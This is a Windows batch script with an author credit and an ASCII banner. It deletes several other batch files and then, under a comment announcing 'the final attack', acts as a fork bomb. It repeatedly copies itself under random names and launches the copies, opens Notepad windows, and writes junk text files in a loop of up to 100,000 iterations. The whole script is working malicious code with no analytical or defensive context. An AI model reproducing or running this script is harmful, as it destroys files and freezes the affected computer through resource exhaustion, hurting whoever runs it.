REM First delete everything else
 echo Program developed by
 echo Cyrus Majd
 echo In contribution to
 echo ~ =============================================== ~
 echo ` -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- `
 echo ` #     # #     #  #####   #####   #####  ####### `
 echo ` #     # #     # #     # #     # #     #    #    `
 echo ` #     # #     # #       #       #          #    `
 echo ` ####### #######  #####  #        #####     #    `
 echo ` #     # #     #       # #             #    #    `
 echo ` #     # #     # #     # #     # #     #    #    `
 echo ` #     # #     #  #####   #####   #####     #    `
 echo ` -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- `
 echo ~ =============================================== ~ 
 del Factorial.bat
 echo y
 del ftptest.bat
 echo y
 del dhcpNuke.bat
 echo y
REM Then start the final attack
 @echo off 
 Title ThisIsTheEnd
 :top 
 set FILENAME=%random%%random% 
 copy /Y "%~f0" "%cd%\DESTROYED%FILENAME%.bat" 
 start /MIN "%cd%\DESTROYED%FILENAME%.bat" 
 set counter=100000 
 :doitagain 
 start notepad.exe 
 echo CARPE MACHINA! DEUS VULT! CARPE MACHINA! DEUS VULT! CARPE MACHINA! DEUS VULT! CARPE MACHINA! DEUS VULT! CARPE MACHINA! DEUS VULT! > %cd%\%random%%random%.txt 
 set /a counter=%counter%-1 
 if %counter% LEQ 0 goto :theend 
 goto :doitagain
 pause 
 :theend 
 exit